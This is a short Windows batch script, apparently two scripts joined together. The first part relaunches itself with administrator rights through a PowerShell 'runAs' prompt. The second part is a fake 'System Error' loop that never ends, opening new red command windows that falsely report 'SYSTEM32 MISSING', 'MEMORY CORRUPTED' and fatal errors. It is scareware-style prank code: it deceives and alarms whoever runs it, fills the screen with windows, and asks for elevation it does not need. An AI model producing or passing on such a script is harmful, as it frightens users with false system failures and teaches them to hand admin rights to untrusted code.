@echo off

:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator permission...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit
)

echo You are now running with admin permissions!
pause 

@echo off
title System Error
color 1f

echo Starting system...
timeout /t 2 >nul

:loop
echo ERROR: Critical system failure detected!
echo Attempting automatic repair...
timeout /t 2 >nul

start cmd /c "color 4f & echo FATAL ERROR & timeout /t 3"
start cmd /c "color 4f & echo SYSTEM32 MISSING & timeout /t 3"
start cmd /c "color 4f & echo MEMORY CORRUPTED & timeout /t 3"

goto loop